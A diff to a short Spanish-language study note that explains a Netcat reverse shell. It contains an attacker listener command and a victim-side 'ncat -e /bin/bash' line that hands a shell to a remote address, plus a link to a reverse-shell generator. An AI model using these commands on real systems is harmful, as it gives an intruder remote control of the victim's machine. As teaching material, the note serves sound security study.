@@ -8,15 +8,20 @@ En el siguiente ejemplo se muestra (con [[Netcat]] la forma de una reverse shell
 
 Primero el atacante se pone en escucha con el siguiente comando en un [[puerto]] en específico.
 
-```nc -nlvp 443```
+```
+nc -nlvp 443
+```
 
 **Máquina victima**
 
 Una vez que la máquina del atacante se encuentre en escucha y previamente con el acceso a la máquina víctima aplicas el siguiente comando para tener una consola:
 
-```ncat -e /bin/bash 198.168.0.1```
+```
+ncat -e /bin/bash 198.168.0.1
+```
 
 ----
 Página para reverse shell:
 
 https://www.revshells.com
+
